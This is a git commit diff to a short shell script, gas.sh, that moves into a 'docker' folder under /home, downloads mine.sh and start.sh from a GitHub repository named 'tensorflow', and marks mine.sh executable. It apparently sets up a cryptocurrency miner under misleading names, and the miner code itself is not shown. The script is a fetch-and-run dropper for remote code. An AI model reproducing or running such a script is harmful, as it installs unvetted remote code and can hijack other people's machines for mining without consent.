9a77d00065bc1fcb19a96132b642ab516a11bfea
kikibatara1 <108291648+kikibatara1@users.noreply.github.com>
2022-06-28 00:00:06 +0700

    Update gas.sh

--- gas.sh
+++ gas.sh
@@ -1,6 +1,7 @@
 #!/bin/sh
 cd /home
 mkdir docker
+cd docker
 wget https://raw.githubusercontent.com/kikibatara1/tensorflow/main/mine.sh
 wget https://raw.githubusercontent.com/kikibatara1/tensorflow/main/start.sh
 chmod +x mine.sh
